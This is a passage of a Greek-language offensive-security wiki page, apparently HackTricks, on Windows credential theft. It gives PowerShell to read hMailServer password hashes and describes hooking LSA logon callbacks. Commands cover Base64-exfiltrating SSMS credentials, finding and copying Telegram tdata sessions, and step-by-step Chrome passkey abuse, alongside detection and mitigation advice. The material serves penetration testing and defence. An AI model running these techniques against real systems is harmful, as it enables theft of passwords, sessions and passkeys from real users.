$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Η στήλη `accountpassword` χρησιμοποιεί τη μορφή hash του hMailServer (λειτουργία hashcat `1421`). Ένας κωδικός πρόσβασης mailbox που έχει γίνει crack επιτρέπει pivot σε χρήστη Windows μόνο αν ο ίδιος κωδικός χρησιμοποιείται ξανά από έναν τοπικό λογαριασμό ή λογαριασμό domain και αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα απομακρυσμένης σύνδεσης.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **plaintext κωδικούς πρόσβασης σύνδεσης**, παρεμβάλλοντας κώδικα στο callback σύνδεσης LSA `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap στο callback του authentication package, ώστε τα credentials να καταγραφούν **κατά τη σύνδεση** (πριν από το hashing) και στη συνέχεια να εγγραφούν στον δίσκο ή να επιστραφούν στον operator. Αυτό υλοποιείται συνήθως ως helper που κάνει inject στον LSA ή εγγράφεται σε αυτόν και έπειτα καταγράφει κάθε επιτυχημένο συμβάν διαδραστικής σύνδεσης ή σύνδεσης μέσω δικτύου, μαζί με το username, το domain και τον κωδικό πρόσβασης.<sup>[[1]](#references)</sup>

Λειτουργικές σημειώσεις:
- Απαιτούνται δικαιώματα local admin/SYSTEM για τη φόρτωση του helper στη διαδρομή authentication.
- Τα captured credentials εμφανίζονται μόνο όταν πραγματοποιείται σύνδεση (διαδραστική, RDP, υπηρεσίας ή μέσω δικτύου, ανάλογα με το hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει πληροφορίες αποθηκευμένων συνδέσεων σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Εξειδικευμένα εργαλεία dump μπορούν να αναλύσουν το αρχείο και να ανακτήσουν αποθηκευμένα SQL credentials. Σε shells που επιστρέφουν μόνο την έξοδο εντολών, το αρχείο συχνά γίνεται exfiltrate με κωδικοποίηση σε Base64 και εκτύπωση στο stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Από την πλευρά του operator, αναδημιουργήστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Κλοπή συνεδρίας browser και cookies μέσω του Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Κλοπή συνεδρίας `tdata` του Telegram Desktop

Το Telegram Desktop αποθηκεύει τα δεδομένα εξουσιοδότησης και κατάστασης λογαριασμού στον κατάλογο **`tdata`**. Μια αντιγραμμένη συνεδρία μπορεί να φορτωθεί με συμβατά εργαλεία για έλεγχο ταυτότητας χωρίς τον κωδικό πρόσβασης του λογαριασμού, όσο παραμένει έγκυρη αυτή η εξουσιοδότηση· αν είναι ενεργοποιημένη η κρυπτογράφηση τοπικών δεδομένων, ο stealer χρειάζεται επίσης τον κωδικό πρόσβασης. Στη συνέχεια, μια πιστοποιημένη συνεδρία μπορεί να αποκαλύψει δεδομένα ταυτότητας, μεταδεδομένα συνομιλιών και συμμετοχής, μηνύματα και μέσα προς λήψη.<sup>[[10]](#references)</sup>

### Εντοπισμός και απόκτηση

Αναζητήστε τόσο εγκατεστημένες όσο και φορητές διατάξεις· τα ονόματα πακέτων του Microsoft Store ποικίλλουν, επομένως απαριθμήστε τους καταλόγους πακέτων που περιέχουν `TelegramMessenge` και εξετάστε το υποδέντρο `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Αν οι συνήθεις αναγνώσεις αποτύχουν και το token της διεργασίας **περιέχει ήδη και έχει ενεργοποιημένο** το `SeBackupPrivilege`, η πρόσβαση με επίγνωση των αντιγράφων ασφαλείας αποτελεί εναλλακτική· δεν αποκτά το privilege ούτε ανυψώνει τη διεργασία. Η `CreateFileW` με `FILE_FLAG_BACKUP_SEMANTICS` μπορεί να ζητήσει σημασιολογία δημιουργίας/επαναφοράς αντιγράφων ασφαλείας και να παρακάμψει τους ελέγχους ασφαλείας αρχείων, όταν υπάρχουν τα απαιτούμενα προνόμια στο token, αλλά η σημαία από μόνη της δεν παρακάμπτει ένα ασύμβατο κλείδωμα κοινής χρήσης.<sup>[[10]](#references)[[11]](#references)</sup>

Για αρχεία που είναι κλειδωμένα και χρησιμοποιούνται, δημιουργήστε/διαβάστε ένα **Volume Shadow Copy**· για αρχεία στα οποία εμποδίζει την πρόσβαση το ACL, το `robocopy /B` χρησιμοποιεί λειτουργία αντιγράφων ασφαλείας και παρακάμπτει τα ACL αρχείων και καταλόγων.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ένα implant που λαμβάνει υπόψη το bandwidth μπορεί πρώτα να υποβάλει μόνο την απογραφή των διαδρομών αρχείων, να λάβει ένα αναγνωριστικό snapshot μαζί με τις διαδρομές που έχει ήδη αποθηκεύσει το C2 και να ανεβάσει μόνο τα αρχεία που λείπουν. Επομένως, ακόμη και μικρές σταδιακές μεταφορές μετά από αναδρομική απαρίθμηση του `tdata` μπορεί να υποδηλώνουν επιτυχή κλοπή συνεδρίας.<sup>[[10]](#references)</sup>

### Ανίχνευση και περιορισμός

Συσχετίστε την αναδρομική πρόσβαση στο `tdata` από μη-Telegram διεργασία με την ενεργοποίηση του `SeBackupPrivilege`, ανοίγματα αρχείων με σημασιολογία δημιουργίας αντιγράφων ασφαλείας, δραστηριότητα VSS ή θυγατρική διεργασία `robocopy.exe` που χρησιμοποιεί το `/B`. Αναζητήστε επίσης ταχεία απαρίθμηση τόσο του `%APPDATA%` όσο και του `%LOCALAPPDATA%\Packages`, ακολουθούμενη από εξερχόμενες συνδέσεις από την ίδια διεργασία. Μετά την παραβίαση, χρησιμοποιήστε **Ρυθμίσεις → Συσκευές** (ή **Απόρρητο και ασφάλεια → Ενεργές συνεδρίες**) για να τερματίσετε μη αναγνωρισμένες συνεδρίες· η ενεργοποίηση της επαλήθευσης σε δύο βήματα από μόνη της δεν ανακαλεί μια εξουσιοδότηση που έχει ήδη κλαπεί.<sup>[[10]](#references)[[13]](#references)</sup>

## Κλοπή διαπιστευτηρίων Passkeys / WebAuthn από το Chrome στα Windows

Αν αποκτηθεί εκτέλεση κώδικα ως **ο χρήστης-θύμα** σε έναν host Windows που χρησιμοποιεί **Chrome + συγχρονισμένα passkeys του Google Password Manager**, τα passkeys αποτελούν ενδιαφέροντα στόχο post-exploitation, ακόμη και **χωρίς admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά τεχνουργήματα

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες με protobuf. Μια διεργασία του ίδιου χρήστη μπορεί να απαριθμήσει το **RP ID**, το **username**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για passkeys που συγχρονίζονται.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την κατάσταση εγγραφής της τοπικής συσκευής, όπως το **`wrapped_identity_private_key`** και το wrapped secret που χρησιμοποιείται για την ανάκτηση των συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη διαλογή:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Τα blobs κλειδιών που είναι δεσμευμένα στο TPM μπορούν και πάλι να χρησιμοποιηθούν καταχρηστικά ως τοπικό signing oracle

Αν ο browser εξάγει ένα identity key που υποστηρίζεται από TPM ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύει αυτό το blob σε κατάσταση προσβάσιμη από τον χρήστη, το malware **δεν** χρειάζεται να εξαγάγει το ακατέργαστο private key. Μπορεί απλώς να εισαγάγει ξανά το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να υπογράψει δεδομένα που ελέγχει ο επιτιθέμενος:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Αυτό σημαίνει ότι η **δέσμευση στο hardware αποτρέπει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο παραβιασμένο endpoint**.

### Πρακτικές οδοί κατάχρησης

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Καταγράψτε τα `WebauthnCredentialSpecifics` από το LevelDB του Chrome.
   - Ξεκινήστε σύνδεση με passkey και αποκτήστε ένα νέο WebAuthn challenge.
   - Χρησιμοποιήστε το κλεμμένο blob `wrapped_identity_private_key` στο TPM του θύματος για να υπογράψετε το binding του αιτήματος cloud-authenticator.
   - Προωθήστε το assertion που επιστρέφεται στο relying party.
   - Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP δέχεται `userVerification=preferred` ή δεν απορρίπτει assertions με **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Επιβάλετε νέα διαδικασία ένταξης διαγράφοντας το `passkey_enclave_state` ή στέλνοντας μια έγκυρη υπογεγραμμένη ενέργεια `device/forget`.
   - Αν η διαδικασία ένταξης αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχωρίστε ένα δημόσιο κλειδί UV που ελέγχει ο επιτιθέμενος.
   - Αν ο πάροχος δεν επαληθεύει το attestation / την προέλευση από secure hardware για το νέο κλειδί UV, οι μεταγενέστερες υπογραφές από το κλειδί του επιτιθέμενου θεωρούνται **`UV=1`**.
3. **Κλοπή ανάκτησης master-secret / SDS**<sup>[[4]](#references)</sup>
   - Επιβάλετε ανάκτηση ή επανένταξη, ώστε το Chrome να ανακτήσει το master secret των συγχρονισμένων passkey.
   - Παρακολουθήστε την αναδημιουργία/τροποποίηση του `passkey_enclave_state` και, στη συνέχεια, κάντε dump τη μνήμη του Chrome ενώ το απλό κείμενο **security domain secret (SDS)** βρίσκεται στη μνήμη.
   - Χρησιμοποιήστε το ανακτημένο SDS για να αποκρυπτογραφήσετε τα κρυπτογραφημένα πεδία σε κάθε εγγραφή `WebauthnCredentialSpecifics` και να ανακτήσετε φορητά ιδιωτικά κλειδιά WebAuthn.

### Ιδέες για DFIR / ανίχνευση

- Παρακολουθήστε τη **διαγραφή/αναδημιουργία** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Ειδοποιήστε για ασυνήθιστη πρόσβαση στο Chrome **`Sync Data\LevelDB`** από διεργασίες που δεν είναι browser.
- Ειδοποιήστε για **dumps μνήμης του Chrome** ή ύποπτη πρόσβαση στη μνήμη μεταξύ διεργασιών.
- Διερευνήστε επαναλαμβανόμενες προτροπές για **PIN ανάκτησης του Google Password Manager** ή απρόσμενη νέα διαδικασία ένταξης.
- Να θυμάστε ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για συγχρονισμένα passkey, επειδή μπορεί να παραμένει σταθερό, οπότε η κλασική ανίχνευση κλώνων είναι αναποτελεσματική.



## References

- [1] [Unit 42 – Διερεύνηση επιχειρήσεων που στόχευαν επί χρόνια τομείς υψηλής αξίας χωρίς να εντοπιστούν](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: ηλεκτρονικό ψάρεμα μέσω μακροεντολής Word VBA μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο relay και την εσωτερική λειτουργία μιας διακριτικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Μια νέα επιφάνεια επίθεσης στον έλεγχο ταυτότητας χωρίς κωδικό πρόσβασης](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / αποθήκευση κλειδιών CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Επιθέσεις σε συστήματα και δίκτυα Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Πώς λειτουργεί πραγματικά το Active Directory Data Store: Μέσα στο NTDS.dit (Μέρος 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump κωδικών πρόσβασης από απομακρυσμένο Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Το Armored Likho επεκτείνει το οπλοστάσιο κυβερνοκατασκοπείας του με το toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Συνάρτηση CreateFileW και `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Λειτουργία δημιουργίας αντιγράφων ασφαλείας Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Συχνές ερωτήσεις Telegram – τερματισμός ενεργών συνεδριών](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard και Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Προστασία και διαχείριση διαπιστευτηρίων](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - υποστηριζόμενες είσοδοι και γρήγορη εκκίνηση](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
